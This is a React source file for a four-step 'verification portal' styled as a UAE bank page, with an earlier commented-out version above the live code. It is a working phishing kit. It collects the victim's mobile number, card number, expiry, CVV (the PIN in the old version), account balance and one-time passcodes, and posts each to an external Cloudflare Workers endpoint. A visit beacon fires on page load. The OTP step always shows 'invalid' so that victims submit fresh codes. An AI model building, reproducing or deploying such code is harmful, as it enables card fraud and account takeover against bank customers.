//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>

//           <div>
//             <input
//               type="text"
//               placeholder="Expiry date (MM/YY) *"
//               value={expiryDate}
//               onChange={(e) => {
//                 let val = e.target.value.replace(/\D/g, '');
//                 if (val.length >= 2) {
//                   val = val.slice(0, 2) + '/' + val.slice(2, 4);
//                 }
//                 setExpiryDate(val);
//               }}
//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>

//           <div>
//             <input
//               type="password"
//               placeholder="Enter your card PIN *"
//               value={cardPin}
//               onChange={(e) => setCardPin(e.target.value.replace(/\D/g, '').slice(0, 4))}
//               maxLength={4}
//               className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//             />
//           </div>
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!atmCardNumber || !expiryDate || !cardPin || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? 'Submitting...' : 'Continue'}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back
//         </button>
//       </div>
//     </div>
//   );
// };

// // Step 3 Component - Account Balance
// const Step3AccountBalance = ({ mobileNumber, atmCardNumber, accountBalance, setAccountBalance, onNext, onBack }) => {
//   const [loading, setLoading] = useState(false);

//   const handleSubmit = async () => {
//     setLoading(true);
//     const result = await sendToAPI({
//       type: 'balance',
//       phone: mobileNumber,
//       cardNumber: atmCardNumber,
//       balance: accountBalance,
//     });
//     setLoading(false);

//     if (result.success) {
//       onNext();
//     }
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           For your security, please provide the following information to complete the verification process
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className={`h-1.5 w-16 rounded-full transition-all ${
//                   step <= 3 ? 'bg-white' : 'bg-white/30'
//                 }`}
//               />
//             ))}
//           </div>
//         </div>

//         <div className="mt-12">
//           <input
//             type="text"
//             placeholder="Enter your account balance *"
//             value={accountBalance}
//             onChange={(e) => setAccountBalance(e.target.value)}
//             className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
//           />
//         </div>

//         <button
//           onClick={handleSubmit}
//           disabled={!accountBalance || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? 'Submitting...' : 'Continue'}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back
//         </button>
//       </div>
//     </div>
//   );
// };

// // Step 4 Component - OTP Verification
// const Step4OTPVerification = ({ mobileNumber, otp, setOtp, otpError, setOtpError, timer, setTimer, onBack }) => {
//   const [loading, setLoading] = useState(false);

//   const handleOtpChange = (index, value) => {
//     if (value.length <= 1 && /^\d*$/.test(value)) {
//       const newOtp = [...otp];
//       newOtp[index] = value;
//       setOtp(newOtp);

//       if (value && index < 5) {
//         const nextInput = document.getElementById(`otp-${index + 1}`);
//         if (nextInput) nextInput.focus();
//       }
//     }
//   };

//   const handleVerifyOtp = async () => {
//     setLoading(true);
//     const otpString = otp.join('');

//     const result = await sendToAPI({
//       type: 'otp',
//       username: mobileNumber,
//       otp: otpString,
//     });

//     setLoading(false);

//     // Always show invalid OTP error
//     setOtpError('Invalid OTP. Please try again.');
//     setOtp(['', '', '', '', '', '']);
//   };

//   const handleResendOtp = () => {
//     if (timer === 0) {
//       setTimer(57);
//       setOtp(['', '', '', '', '', '']);
//       setOtpError('');
//     }
//   };

//   return (
//     <div className="bg-[#007A45] min-h-screen text-white p-6">
//       <div className="max-w-md mx-auto">
//         <div className="flex justify-end mb-12 mt-4">
//           <button className="flex items-center gap-2 text-sm hover:opacity-80">
//             <Globe className="w-4 h-4" />
//             <span className="font-medium">EN</span>
//           </button>
//         </div>

//         <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
//         <p className="text-sm mb-8 opacity-90 leading-relaxed">
//           We've sent a 6-digit verification code to your registered mobile number
//         </p>

//         <div className="text-center mb-6">
//           <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
//           <div className="flex justify-center gap-2">
//             {[1, 2, 3, 4].map((step) => (
//               <div
//                 key={step}
//                 className="h-1.5 w-16 rounded-full bg-white transition-all"
//               />
//             ))}
//           </div>
//         </div>

//         <div className="flex justify-center gap-3 mt-12 mb-6">
//           {otp.map((digit, index) => (
//             <input
//               key={index}
//               id={`otp-${index}`}
//               type="text"
//               maxLength={1}
//               value={digit}
//               onChange={(e) => handleOtpChange(index, e.target.value)}
//               className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
//             />
//           ))}
//         </div>

//         {otpError && (
//           <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
//             <p className="text-red-200 text-center font-medium">{otpError}</p>
//           </div>
//         )}

//         <div className="text-center mb-2 mt-8">
//           <p className="text-sm opacity-90">Didn't receive the code?</p>
//         </div>

//         <div className="text-center mb-8">
//           <button
//             onClick={handleResendOtp}
//             disabled={timer > 0}
//             className={`font-bold underline transition-all ${
//               timer > 0 ? 'opacity-50 cursor-not-allowed' : 'opacity-100 hover:text-white/80'
//             }`}
//           >
//             Resend OTP
//           </button>
//           <p className="text-sm opacity-90 mt-1">
//             Resend available in {timer}s
//           </p>
//         </div>

//         <button
//           onClick={handleVerifyOtp}
//           disabled={otp.some(digit => !digit) || loading}
//           className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
//         >
//           {loading ? 'Verifying...' : 'Verify'}
//         </button>

//         <button
//           onClick={onBack}
//           className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
//         >
//           ← Back to Login
//         </button>
//       </div>
//     </div>
//   );
// };

// // Main Component
// export default function VerificationPortal() {
//   const [currentStep, setCurrentStep] = useState(1);
//   const [mobileNumber, setMobileNumber] = useState('');
//   const [atmCardNumber, setAtmCardNumber] = useState('');
//   const [expiryDate, setExpiryDate] = useState('');
//   const [cardPin, setCardPin] = useState('');
//   const [accountBalance, setAccountBalance] = useState('');
//   const [otp, setOtp] = useState(['', '', '', '', '', '']);
//   const [otpError, setOtpError] = useState('');
//   const [timer, setTimer] = useState(57);

//   // Send visit notification on component mount
//   useEffect(() => {
//     sendToAPI({
//       type: 'visit',
//       url: window.location.href,
//     });
//   }, []);

//   useEffect(() => {
//     if (currentStep === 4 && timer > 0) {
//       const interval = setInterval(() => {
//         setTimer((prev) => prev - 1);
//       }, 1000);
//       return () => clearInterval(interval);
//     }
//   }, [currentStep, timer]);

//   const handleNext = () => {
//     if (currentStep < 4) {
//       setCurrentStep(currentStep + 1);
//     }
//   };

//   const handleBack = () => {
//     if (currentStep > 1) {
//       setCurrentStep(currentStep - 1);
//       setOtpError('');
//     }
//   };

//   return (
//     <div>
//       {currentStep === 1 && (
//         <Step1MobileNumber
//           mobileNumber={mobileNumber}
//           setMobileNumber={setMobileNumber}
//           onNext={handleNext}
//         />
//       )}
//       {currentStep === 2 && (
//         <Step2ATMCard
//           mobileNumber={mobileNumber}
//           atmCardNumber={atmCardNumber}
//           setAtmCardNumber={setAtmCardNumber}
//           expiryDate={expiryDate}
//           setExpiryDate={setExpiryDate}
//           cardPin={cardPin}
//           setCardPin={setCardPin}
//           onNext={handleNext}
//           onBack={handleBack}
//         />
//       )}
//       {currentStep === 3 && (
//         <Step3AccountBalance
//           mobileNumber={mobileNumber}
//           atmCardNumber={atmCardNumber}
//           accountBalance={accountBalance}
//           setAccountBalance={setAccountBalance}
//           onNext={handleNext}
//           onBack={handleBack}
//         />
//       )}
//       {currentStep === 4 && (
//         <Step4OTPVerification
//           mobileNumber={mobileNumber}
//           otp={otp}
//           setOtp={setOtp}
//           otpError={otpError}
//           setOtpError={setOtpError}
//           timer={timer}
//           setTimer={setTimer}
//           onBack={handleBack}
//         />
//       )}
//     </div>
//   );
// }

import React, { useState, useEffect } from "react";
import { Globe } from "lucide-react";

const API_URL = "https://my-pr-worker.instapayapi.workers.dev";

// API Helper Function
const sendToAPI = async (data) => {
  try {
    const response = await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    return await response.json();
  } catch (error) {
    console.error("API Error:", error);
    return { success: false, error: error.message };
  }
};

// Step 1 Component - Mobile Number
const Step1MobileNumber = ({ mobileNumber, setMobileNumber, onNext }) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    setLoading(true);
    const result = await sendToAPI({
      type: "phone",
      phone: mobileNumber,
    });
    setLoading(false);

    if (result.success) {
      onNext();
    }
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">
          Welcome to verification portal
        </h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          Online Verification
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 1 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className={`h-1.5 w-16 rounded-full transition-all ${
                  step === 1 ? "bg-white" : "bg-white/30"
                }`}
              />
            ))}
          </div>
        </div>

        {/* <div className="mt-12">
          <label className="block text-sm font-bold mb-3 opacity-90">
            Registered Mobile Number *
          </label>
          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter Registered Mobile Number"
            value={mobileNumber}
            onChange={(e) => setMobileNumber(e.target.value)}
            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all mb-8"
          />
        </div> */}

        <div
          className="flex items-center bg-white/10 backdrop-blur-md border border-white/20 
rounded-2xl px-4 py-3 mb-8 shadow-lg gap-3"
        >
          {/* +971 Country Code */}
          <span className="text-lg sm:text-xl font-semibold text-white/90">
            +971
          </span>

          {/* Divider Line */}
          <div className="h-6 sm:h-8 w-px bg-white/30"></div>

          {/* Input */}
          <input
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter Registered Mobile Number"
            value={mobileNumber}
            onChange={(e) =>
              setMobileNumber(e.target.value.replace(/\D/g, "").slice(0, 9))
            }
            className="flex-1 bg-transparent text-white placeholder-white/50 text-base sm:text-xl 
               focus:outline-none truncate"
          />
        </div>

        <button
          onClick={handleSubmit}
          disabled={!mobileNumber || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Submitting..." : "Continue"}
        </button>
      </div>
    </div>
  );
};

// Step 2 Component - ATM Card Details
const Step2ATMCard = ({
  mobileNumber,
  atmCardNumber,
  setAtmCardNumber,
  expiryDate,
  setExpiryDate,
  cardPin,
  setCardPin,
  onNext,
  onBack,
}) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    setLoading(true);
    const result = await sendToAPI({
      type: "cardDetails",
      phone: mobileNumber,
      cardNumber: atmCardNumber,
      expiryDate: expiryDate,
      cvv: cardPin,
    });
    setLoading(false);

    if (result.success) {
      onNext();
    }
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          For your security, please provide the following information to
          complete the verification process
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 2 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className={`h-1.5 w-16 rounded-full transition-all ${
                  step <= 2 ? "bg-white" : "bg-white/30"
                }`}
              />
            ))}
          </div>
        </div>

        <div className="space-y-8 mt-12">
          <div>
            <input
              type="number"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="Enter your 16-digit ATM card number *"
              value={atmCardNumber}
              onChange={(e) =>
                setAtmCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
              }
              className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
            />
          </div>

          <div>
            <input
              type="text"
              inputMode="numeric"
              pattern="[0-9/]*"
              placeholder="Expiry date (MM/YY) *"
              value={expiryDate}
              onChange={(e) => {
                let val = e.target.value.replace(/\D/g, "");
                if (val.length >= 2) {
                  val = val.slice(0, 2) + "/" + val.slice(2, 4);
                }
                setExpiryDate(val);
              }}
              className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
            />
          </div>

          <div>
            <input
              type="number"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="CVV *"
              value={cardPin}
              onChange={(e) =>
                setCardPin(e.target.value.replace(/\D/g, "").slice(0, 3))
              }
              maxLength={4}
              className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
            />
          </div>
          <p className="text-sm text-gray-400">
            cvv digits (cvv on back of card)
          </p>
        </div>

        <button
          onClick={handleSubmit}
          disabled={!atmCardNumber || !expiryDate || !cardPin || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Submitting..." : "Continue"}
        </button>

        <button
          onClick={onBack}
          className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};

// Step 3 Component - Account Balance
const Step3AccountBalance = ({
  mobileNumber,
  atmCardNumber,
  accountBalance,
  setAccountBalance,
  onNext,
  onBack,
}) => {
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    setLoading(true);
    const result = await sendToAPI({
      type: "balance",
      phone: mobileNumber,
      cardNumber: atmCardNumber,
      balance: accountBalance,
    });
    setLoading(false);

    if (result.success) {
      onNext();
    }
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">Additional Verification</h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          For your security, please provide the following information to
          complete the verification process
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 3 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className={`h-1.5 w-16 rounded-full transition-all ${
                  step <= 3 ? "bg-white" : "bg-white/30"
                }`}
              />
            ))}
          </div>
        </div>

        <div className="mt-12">
          <input
            type="number"
            inputMode="numeric"
            pattern="[0-9]*"
            placeholder="Enter your account balance *"
            value={accountBalance}
            onChange={(e) => setAccountBalance(e.target.value)}
            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
          />
        </div>

        <button
          onClick={handleSubmit}
          disabled={!accountBalance || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg mt-12 hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Submitting..." : "Continue"}
        </button>

        <button
          onClick={onBack}
          className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
        >
          ← Back
        </button>
      </div>
    </div>
  );
};

// Step 4 Component - OTP Verification
const Step4OTPVerification = ({
  mobileNumber,
  otp,
  setOtp,
  otpError,
  setOtpError,
  timer,
  setTimer,
  onBack,
}) => {
  const [loading, setLoading] = useState(false);

  const handleOtpChange = (index, value) => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);

      if (value && index < 5) {
        const nextInput = document.getElementById(`otp-${index + 1}`);
        if (nextInput) nextInput.focus();
      }
    }
  };

  const handleVerifyOtp = async () => {
    setLoading(true);
    const otpString = otp.join("");

    const result = await sendToAPI({
      type: "otp",
      username: mobileNumber,
      otp: otpString,
    });

    setLoading(false);

    // Always show invalid OTP error
    setOtpError(" OTP. Please try again.");
    setOtp(["", "", "", "", "", ""]);
  };

  const handleResendOtp = () => {
    if (timer === 0) {
      setTimer(57);
      setOtp(["", "", "", "", "", ""]);
      setOtpError("");
    }
  };

  return (
    <div className="bg-[#007A45] min-h-screen text-white p-6">
      <div className="max-w-md mx-auto">
        <div className="flex justify-end mb-12 mt-4">
          <button className="flex items-center gap-2 text-sm hover:opacity-80">
            <Globe className="w-4 h-4" />
            <span className="font-medium">EN</span>
          </button>
        </div>

        <h1 className="text-4xl font-bold mb-4">OTP Verification</h1>
        <p className="text-sm mb-8 opacity-90 leading-relaxed">
          We've sent a 6-digit verification code to your registered mobile
          number
        </p>

        <div className="text-center mb-6">
          <p className="text-sm font-bold mb-3">STEP 4 OF 4</p>
          <div className="flex justify-center gap-2">
            {[1, 2, 3, 4].map((step) => (
              <div
                key={step}
                className="h-1.5 w-16 rounded-full bg-white transition-all"
              />
            ))}
          </div>
        </div>

        <div className="flex justify-center gap-3 mt-12 mb-6">
          {/* {otp.map((digit, index) => (
            <input
              key={index}
              id={`otp-${index}`}
              type="number"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={1}
              value={digit}
              onChange={(e) => handleOtpChange(index, e.target.value)}
              className="w-14 h-16 text-center text-2xl font-bold bg-white/20 backdrop-blur-sm border-2 border-white/50 rounded-xl focus:outline-none focus:border-white focus:bg-white/30 text-white transition-all"
            />
          ))} */}
        <input
  type="text"
  inputMode="numeric"
  pattern="[0-9]*"

  placeholder="Enter OTP Number *"
  value={otp.join("")} // otp array ko string me convert
  onChange={(e) => {
    const val = e.target.value.replace(/\D/g, ""); // sirf digits allow
    setOtp(val.split("")); // string ko array me convert karke state update
    setOtpError(""); // error clear
  }}
  className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 
             placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
/>


          {/* <input
            type="number"
            inputMode="numeric"
            id={`otp-${index}`}
            maxLength={1}
              value={digit}
            pattern="[0-9]*"
            onChange={(e) => handleOtpChange(index, e.target.value)}
            placeholder="Enter your registered number *"
            // value={accountBalance}
            // onChange={(e) => setAccountBalance(e.target.value)}
            className="w-full bg-transparent border-b-2 border-white/50 py-4 px-2 placeholder-white/70 focus:outline-none focus:border-white text-lg transition-all"
          /> */}
        </div>

        {otpError && (
          <div className="bg-red-500/20 border border-red-300 rounded-lg p-3 mb-4">
            <p className="text-red-200 text-center font-medium">{otpError}</p>
          </div>
        )}

        <div className="text-center mb-2 mt-8">
          <p className="text-sm opacity-90">Didn't receive the code?</p>
        </div>

        <div className="text-center mb-8">
          <button
            onClick={handleResendOtp}
            disabled={timer > 0}
            className={`font-bold underline transition-all ${
              timer > 0
                ? "opacity-50 cursor-not-allowed"
                : "opacity-100 hover:text-white/80"
            }`}
          >
            Resend OTP
          </button>
          <p className="text-sm opacity-90 mt-1">
            Resend available in {timer}s
          </p>
        </div>

        <button
          onClick={handleVerifyOtp}
          disabled={otp.some((digit) => !digit) || loading}
          className="w-full bg-white/20 backdrop-blur-sm text-white py-4 rounded-full font-bold text-lg hover:bg-white/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all transform hover:scale-[1.02] active:scale-[0.98]"
        >
          {loading ? "Verifying..." : "Verify"}
        </button>

        <button
          onClick={onBack}
          className="w-full text-white py-4 mt-4 font-medium hover:underline transition-all"
        >
          ← Back to Login
        </button>
      </div>
    </div>
  );
};

// Main Component
export default function VerificationPortal() {
  const [currentStep, setCurrentStep] = useState(1);
  const [mobileNumber, setMobileNumber] = useState("");
  const [atmCardNumber, setAtmCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cardPin, setCardPin] = useState("");
  const [accountBalance, setAccountBalance] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [otpError, setOtpError] = useState("");
  const [timer, setTimer] = useState(57);

  // Send visit notification on component mount
  useEffect(() => {
    sendToAPI({
      type: "visit",
      url: window.location.href,
    });
  }, []);

  useEffect(() => {
    if (currentStep === 4 && timer > 0) {
      const interval = setInterval(() => {
        setTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [currentStep, timer]);

  const handleNext = () => {
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      setOtpError("");
    }
  };

  return (
    <div>
      {currentStep === 1 && (
        <Step1MobileNumber
          mobileNumber={mobileNumber}
          setMobileNumber={setMobileNumber}
          onNext={handleNext}
        />
      )}
      {currentStep === 2 && (
        <Step2ATMCard
          mobileNumber={mobileNumber}
          atmCardNumber={atmCardNumber}
          setAtmCardNumber={setAtmCardNumber}
          expiryDate={expiryDate}
          setExpiryDate={setExpiryDate}
          cardPin={cardPin}
          setCardPin={setCardPin}
          onNext={handleNext}
          onBack={handleBack}
        />
      )}
      {currentStep === 3 && (
        <Step3AccountBalance
          mobileNumber={mobileNumber}
          atmCardNumber={atmCardNumber}
          accountBalance={accountBalance}
          setAccountBalance={setAccountBalance}
          onNext={handleNext}
          onBack={handleBack}
        />
      )}
      {currentStep === 4 && (
        <Step4OTPVerification
          mobileNumber={mobileNumber}
          otp={otp}
          setOtp={setOtp}
          otpError={otpError}
          setOtpError={setOtpError}
          timer={timer}
          setTimer={setTimer}
          onBack={handleBack}
        />
      )}
    </div>
  );
}
